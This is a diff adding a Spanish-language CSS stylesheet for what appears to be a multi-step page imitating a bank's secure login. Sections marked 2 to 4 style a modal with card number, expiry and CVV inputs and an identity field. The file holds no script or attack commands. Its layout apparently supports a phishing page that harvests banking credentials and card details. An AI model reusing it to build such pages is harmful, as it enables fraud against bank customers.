@@ -1,0 +1,724 @@
+@font-face {
+  font-family: "cnx-regular";
+  src: url("../fonts/cnx-regular.eot");
+  src: url("../fonts/cnx-regular.eot?#iefix") format("embedded-opentype"),
+    url("../fonts/cnx-regular.woff") format("woff"),
+    url("../fonts/cnx-regular.ttf") format("truetype");
+  font-weight: normal;
+  font-style: normal;
+  font-variant: normal;
+}
+
+@font-face {
+  font-family: "cnx-bold";
+  src: url("../fonts/cnx-bold.eot");
+  src: url("../fonts/cnx-bold.eot") format("embedded-opentype"),
+    url("../fonts/cnx-bold.woff2") format("woff2"),
+    url("../fonts/cnx-bold.woff") format("woff"),
+    url("../fonts/cnx-bold.ttf") format("truetype");
+  font-weight: 700;
+  font-style: normal;
+  font-variant: normal;
+}
+
+@font-face {
+  font-family: "cnx-medium";
+  src: url("../fonts/cnx-medium.eot");
+  src: url("../fonts/cnx-medium.eot?#iefix") format("embedded-opentype"),
+    url("../fonts/cnx-medium.woff2") format("woff2"),
+    url("../fonts/cnx-medium.woff") format("woff"),
+    url("../fonts/cnx-medium.ttf") format("truetype");
+  font-weight: 300;
+  font-style: normal;
+  font-variant: normal;
+}
+
+body {
+  font-family: Verdana, Arial, Helvetica, sans-serif;
+}
+
+.container {
+  margin: 0px auto;
+  width: 980px;
+}
+
+.banner1 {
+  width: 100%;
+  padding: 20px 0px 7px 25px;
+  display: inline-block;
+}
+
+.banner1 img {
+  width: 230px;
+  height: 28px;
+  float: left;
+}
+
+.banner1 .txtg {
+  float: left;
+  font-size: 20px;
+  color: #837361;
+  font-weight: 400;
+  font-family: Arial, Helvetica, sans-serif;
+  margin: 5px 0px 1px 25px;
+}
+
+.banner1 .derLinks {
+  float: right;
+  font-size: 11px;
+  padding-top: 8px;
+  width: 190px;
+  padding-right: 18px;
+}
+
+.derLinks img.sarea {
+  width: 10px;
+  height: 14px;
+  float: left;
+}
+
+.derLinks .areaSegura {
+  font-weight: bold;
+  padding: 0 10px 0 6px;
+  float: left;
+  color: #666;
+  margin-top: 2px;
+}
+
+.derLinks .lenguaje {
+  position: relative;
+  right: -3px;
+  margin: 2px 10px 0 5px;
+  float: right;
+  color: #666666;
+}
+
+.derLinks img.sarea2 {
+  width: 1px;
+  height: 15px;
+  float: left;
+}
+
+.banner2 {
+  width: 930px;
+  padding-right: 25px;
+  padding-left: 25px;
+  background-color: #dc1431;
+}
+
+.banner2 h1 {
+  font-family: "cnx-regular", Arial, Verdana, Helvetica, sans-serif;
+  font-size: 22px;
+  color: #fff;
+  font-weight: 400;
+  line-height: 60px;
+}
+
+.banner3 {
+  width: 960px;
+}
+
+.banner3 .columnas {
+  margin: 25px 0 44px 25px;
+}
+
+.columnas form {
+  float: left;
+  margin-right: 70px;
+  width: 27.7%;
+}
+
+form .form-group {
+  margin-bottom: 44px;
+}
+form .form-group-l {
+  margin-bottom: 22px;
+}
+form .form-group label.titulo-input {
+  font-family: Arial, Verdana, Helvetica, sans-serif;
+  font-size: 18px;
+  font-weight: normal;
+  padding-bottom: 4px;
+  letter-spacing: 0px;
+}
+
+form .form-group label.titulo-input2 {
+  font-family: Arial, Verdana, Helvetica, sans-serif;
+  font-size: 18px;
+  font-weight: 400;
+  padding-bottom: 4px;
+  letter-spacing: 0px;
+}
+
+form .form-group input[type="text"],
+input[type="password"] {
+  width: 209px;
+  height: 14px;
+  display: block;
+  border: 1px solid #ccc;
+  padding: 4px 2px;
+  margin-top: 9px;
+  font-family: Arial, Helvetica, sans-serif;
+  font-size: 12px;
+}
+
+form .form-group input[type="checkbox"] {
+  margin-top: 10px;
+  margin-right: 7px;
+  margin-left: 1px;
+  margin-bottom: 0px;
+}
+
+form .form-group label.inline-titulo-input {
+  font-size: 13px;
+  font-family: Arial, Verdana, Helvetica, sans-serif;
+  line-height: 20px;
+  vertical-align: 1px;
+}
+
+form .form-group img {
+  vertical-align: -2px;
+  margin-left: 1px;
+}
+
+form .form-group a {
+  font-family: Arial, Helvetica, sans-serif;
+  font-size: 12px;
+  font-weight: 400;
+  color: #0000ff;
+  line-height: 18px;
+  text-decoration: none;
+}
+
+form .form-group a:hover {
+  text-decoration: underline;
+}
+
+form .form-group .btn-azul {
+  color: #fff;
+  position: relative;
+  display: inline-block;
+  font: bold 15px/22px Arial, Helvetica, sans-serif;
+  text-align: center;
+  vertical-align: middle;
+  border-radius: 5px;
+  font-size: 13px;
+  padding: 1px 14px;
+  border-color: #124e89;
+  background-color: #0077be;
+  background-image: -webkit-gradient(
+    linear,
+    0 0,
+    0 bottom,
+    from(#007dc3),
+    to(#0067b1)
+  );
+  background-image: -webkit-linear-gradient(#007dc3, #0067b1);
+  background-image: -moz-linear-gradient(#007dc3, #0067b1);
+  background-image: -ms-linear-gradient(#007dc3, #0067b1);
+  background-image: linear-gradient(#007dc3, #0067b1);
+  outline: none;
+  border: 1px solid #666;
+  cursor: pointer;
+}
+
+form .form-group .btn-azul:hover {
+  color: #fff;
+  border-color: #124e89;
+  background-color: #0068b2;
+  background-image: -webkit-gradient(
+    linear,
+    0 0,
+    0 bottom,
+    from(#0067b1),
+    to(#007dc3)
+  );
+  background-image: -webkit-linear-gradient(#0067b1, #007dc3);
+  background-image: -moz-linear-gradient(#0067b1, #007dc3);
+  background-image: -ms-linear-gradient(#0067b1, #007dc3);
+  background-image: linear-gradient(#0067b1, #007dc3);
+}
+
+form .form-group .btn-azul span {
+  padding-left: 15px;
+  color: #fff;
+  background: url(../img/sign-in-sprite.jpg) no-repeat scroll 0 1px transparent;
+}
+
+.columnas .columna2 {
+  float: left;
+  width: 36.8%;
+  border-left: 1px solid #ccc;
+  height: 275px;
+  padding-left: 60px;
+  height: 270px;
+}
+
+.columna2 p.tituloColumna2 {
+  position: relative;
+  top: -4px;
+  font-family: "cnx-regular";
+  font-size: 18px;
+  color: #544a42;
+  line-height: 27px;
+  margin-top: 0px;
+  margin-bottom: 0px;
+}
+
+.columna2 img {
+  width: 149px;
+  float: left;
+  margin-top: 6px;
+  margin-right: 11px;
+}
+
+.columna2 .titulo2Columna2 {
+  font-family: "cnx-regular";
+  margin-top: 56px;
+  font-size: 18px;
+  font-weight: 400;
+  line-height: 27px;
+  color: #544a42;
+  padding-right: 50px;
+  margin-bottom: 10px;
+}
+
+.columna2 .btn-rojo {
+  position: relative;
+  display: inline-block;
+  text-align: center;
+  vertical-align: middle;
+  border-radius: 5px;
+  padding: 0px 14px 2px 14px;
+  border-color: #bb292b;
+  background-color: #dc1431;
+  background-image: -webkit-gradient(
+    linear,
+    0 0,
+    0 bottom,
+    from(#dc1431),
+    to(#c41230)
+  );
+  background-image: -webkit-linear-gradient(#dc1431, #c41230);
+  background-image: -moz-linear-gradient(#dc1431, #c41230);
+  background-image: -ms-linear-gradient(#dc1431, #c41230);
+  background-image: linear-gradient(#dc1431, #c41230);
+  outline: none;
+  border: 0px solid #666;
+  cursor: pointer;
+  width: 127px;
+  height: 58px;
+}
+
+.columna2 .btn-rojo:hover {
+  border-color: #ba2628;
+  background-color: #c61230;
+  background-image: -webkit-gradient(
+    linear,
+    0 0,
+    0 bottom,
+    from(#c41230),
+    to(#dc1431)
+  );
+  background-image: -webkit-linear-gradient(#c41230, #dc1431);
+  background-image: -moz-linear-gradient(#c41230, #dc1431);
+  background-image: -ms-linear-gradient(#c41230, #dc1431);
+  background-image: linear-gradient(#c41230, #dc1431);
+}
+
+.columna2 .btn-rojo span {
+  font: bold 15px/22px "cnx-regular", Arial, Helvetica, sans-serif;
+  color: #fff;
+  font-size: 15px;
+  font-weight: 700;
+}
+
+.columnas .columna3 {
+  width: 20%;
+  float: left;
+  font-family: Verdana, Arial, Helvetica, sans-serif;
+}
+
+.columna3 h2 {
+  position: relative;
+  top: -1px;
+  font-size: 14px;
+  font-weight: 400;
+  color: #333333;
+  border-bottom: 1px solid #e0d9d3;
+  padding: 0px 0 10px;
+  margin-top: 3px;
+  margin-bottom: 7px;
+}
+.columna3 ul {
+  margin-top: 5px;
+  padding: 4px 0px 0px 0px;
+}
+.columna3 ul > li {
+  list-style: none;
+  padding-bottom: 12px;
+}
+
+.columna3 ul li a {
+  font-size: 11px;
+  color: #36c;
+  text-decoration: none;
+  display: inline-block;
+  line-height: 16px;
+}
+.columna3 h2.titulito {
+  margin-top: 27px;
+  line-height: 21px;
+  padding-bottom: 8px;
+}
+.banner4 {
+  width: 930px;
+  background-color: #f3efea;
+  height: 30px;
+  float: left;
+  margin-top: 88px;
+  height: 114px;
+  padding: 6px 25px 25px;
+}
+
+.banner4 .fondolock {
+  background-image: url("../img/lock2.jpg");
+  background-repeat: no-repeat;
+  background-size: cover;
+  background-position: bottom;
+  margin-right: 4px;
+  width: 10px;
+  height: 12px;
+  display: inline-block;
+  vertical-align: -7px;
+}
+
+.banner4 p {
+  font-family: Verdana, Arial, Helvetica, sans-serif;
+  font-size: 11px;
+  font-weight: 700;
+  color: #666666;
+  line-height: 14px;
+  display: inline-block;
+  vertical-align: top;
+}
+.banner4 p:nth-child(2) {
+  vertical-align: -5px;
+  margin-bottom: 10px;
+}
+.banner4 p:nth-child(1) {
+  margin-top: 12px;
+}
+.banner4 .enlaces-footer {
+  margin-top: 0px;
+}
+
+.banner4 .enlaces-footer a {
+  font-family: Verdana, Arial, Helvetica, sans-serif;
+  font-size: 11px;
+  font-weight: 400;
+  color: #36c;
+  text-decoration: none;
+}
+
+.banner4 .enlaces-footer a:nth-child(1) {
+  padding-right: 10px;
+
+  background: url(../img/line.jpg) right 3px no-repeat;
+}
+
+.banner4 .enlaces-footer a:nth-child(2) {
+  padding-right: 10px;
+  margin-left: 4px;
+}
+
+.banner4 .copirait {
+  margin-top: 1px;
+  width: 570px;
+}
+
+.copirait p {
+  vertical-align: bottom;
+  font-weight: 400;
+  font-size: 11px;
+  color: #333333;
+  line-height: 15px;
+  margin-bottom: 0px;
+}
+
+.copirait a {
+  font-weight: 400;
+  font-size: 11px;
+  line-height: 15px;
+  text-decoration: none;
+  color: #36c;
+  background: url(../img/casa.jpg) no-repeat right 2px;
+  padding-right: 20px;
+}
+
+.corporation {
+  vertical-align: top;
+  font-weight: 400;
+  font-size: 11px;
+  color: #333333;
+  line-height: 15px;
+}
+
+/*                
+ 222222222222222    
+2:::::::::::::::22  
+2::::::222222:::::2 
+2222222     2:::::2 
+            2:::::2 
+            2:::::2 
+         2222::::2  
+    22222::::::22   
+  22::::::::222     
+ 2:::::22222        
+2:::::2             
+2:::::2             
+2:::::2       222222
+2::::::2222222:::::2
+2::::::::::::::::::2
+22222222222222222222
+*/
+.form2label {
+  font-family: Arial, Helvetica, sans-serif;
+  font-weight: 400;
+  font-size: 18px;
+}
+.footer-form {
+  margin-top: 30px;
+}
+.btn {
+  color: #666666;
+  text-decoration: none;
+  border-radius: 6px;
+  padding: 1px 10px 4px;
+  cursor: pointer;
+}
+.btn.principal {
+  color: white;
+  border: 2px solid #5b89c1;
+  background: linear-gradient(to top, #2d67af 50%, #5b89c1 50%);
+  font-weight: bold;
+  font-size: 12px;
+}
+.btn.principal:hover {
+  background: linear-gradient(to top, #5b89c1 50%, #2d67af 50%);
+}
+.btn.principal:active,
+.btn.principal:focus {
+  outline: none;
+}
+.btn.secundario {
+  border: 2px solid #d2d2d2;
+  background: linear-gradient(to top, #dddddd 50%, #fefefe 50%);
+  font-weight: bold;
+}
+.btn.secundario:hover {
+  background: linear-gradient(to top, #fefefe 50%, #dddddd 50%);
+}
+.btn.secundario:active,
+.btn.secundario:focus {
+  outline: none;
+}
+.columnaX {
+  width: 80%;
+  display: inline-block;
+  background-color: transparent;
+}
+.columnaX .titulo2 {
+  font-family: "cnx-regular", Arial, Helvetica, sans-serif;
+  font-weight: 400;
+}
+.columnaX p {
+  font-family: "cnx-regular", Arial, Helvetica, sans-serif;
+  font-weight: 400;
+}
+.menosmargin {
+  padding-left: 20px;
+}
+/*   
+ 333333333333333   
+3:::::::::::::::33 
+3::::::33333::::::3
+3333333     3:::::3
+            3:::::3
+            3:::::3
+    33333333:::::3 
+    3:::::::::::3  
+    33333333:::::3 
+            3:::::3
+            3:::::3
+            3:::::3
+3333333     3:::::3
+3::::::33333::::::3
+3:::::::::::::::33 
+ 333333333333333
+*/
+.fondo3 {
+  background-image: url("../img/porteja.png");
+  background-repeat: no-repeat;
+  background-size: 100vw 769px;
+  overflow-x: auto;
+}
+.modal-border {
+  background-color: #fff;
+  width: 700px;
+  height: 415px;
+  margin: 10% auto;
+  position: relative;
+  border: 23px solid rgba(0, 0, 0, 0.6);
+  border-radius: 10px;
+}
+.modal-contenido {
+  background-color: #fff;
+  width: 681px;
+  height: 416px;
+  top: -10px;
+  left: -10px;
+  padding: 10px 20px;
+  margin: 0 auto;
+  position: absolute;
+
+  border-radius: 10px;
+}
+.modal {
+  background-color: rgba(0, 0, 0, 0.3);
+  position: fixed;
+  top: 0;
+  right: 0;
+  bottom: 0;
+  left: 0;
+}
+.cuerpo {
+  width: 100%;
+  height: 500px;
+  font-family: Arial, Helvetica, sans-serif;
+  font-size: 14px;
+}
+
+.modal-contenido > form > .cinput {
+  background-color: #fff;
+  width: 168px;
+  height: 19px;
+  position: absolute;
+  bottom: 249px;
+  left: 341px;
+  border: 1px solid #ccc;
+  font-size: 11px;
+  font-family: Verdana, Geneva, Tahoma, sans-serif;
+}
+
+
+.select{
+  position: absolute;
+  height: 25px;
+  border: 1px solid #ccc;
+  font-size: 11px;
+  font-family: Verdana, Geneva, Tahoma, sans-serif;
+}
+.modal-contenido > form > .mselect {
+  width: 70px;
+  bottom: 213px;
+  left: 342px;
+}
+.modal-contenido > form > .aselect {
+  width: 77px;
+  bottom: 213px;
+  left: 415px;
+}
+.modal-contenido > form > .cvvinput {
+  background-color: #fff;
+  width: 64px;
+  height: 19px;
+  position: absolute;
+  bottom: 181px;
+  left: 343px;
+  border: 1px solid #ccc;
+  font-size: 11px;
+  font-family: Verdana, Geneva, Tahoma, sans-serif;
+}
+.select:active{
+  outline: none;
+}
+.boton{
+  border-radius: 5px;
+  outline: none;
+  border:1px solid #ccc;
+  padding: 7px 15px 7px;
+  font-family: Arial, Helvetica, sans-serif;
+  font-size: 13px;
+  font-weight: bold;
+}
+.bton-azul{
+  border: 1px solid #124e89;
+  background-image: linear-gradient(#007dc3,#0067b1);
+  color:#fff;
+}
+.bton-azul:hover{
+  background-image: linear-gradient(#0067b1,#007dc3);
+  color:#fff;
+}
+.bloque{
+	position: absolute;
+	left: 50px;
+}
+.topform{
+  position:absolute;
+  bottom: 279px;
+  left: 184px;
+  width: 347px;
+}
+.bottomform{
+  position:absolute;
+  bottom: 132px;
+  left: 184px;
+  width: 347px;
+}
+
+/*
+       444444444  
+      4::::::::4  
+     4:::::::::4  
+    4::::44::::4  
+   4::::4 4::::4  
+  4::::4  4::::4  
+ 4::::4   4::::4  
+4::::444444::::444
+4::::::::::::::::4
+4444444444:::::444
+          4::::4  
+          4::::4  
+          4::::4  
+        44::::::44
+        4::::::::4
+        4444444444
+*/
+.ident{
+  height: 27px;
+  border: 1px solid #ccc;
+  width: 215px;
+  font-family: Arial, Helvetica, sans-serif;
+  font-size: 12px;
+}
+
+@media (max-width: 1100px) {
+  .fondo3 {
+    background-image: url("../img/porteja.png");
+    background-repeat: no-repeat;
+    background-position-x: center;
+    background-size: 1400px 769px;
+    overflow-x: scroll;
+  }
+  .modal {
+    background-color: rgba(0, 0, 0, 0.3);
+    position: fixed;
+    top: 0;
+    right: 0;
+    bottom: 0;
+    left: 0;
+    overflow: auto;
+  }
+}
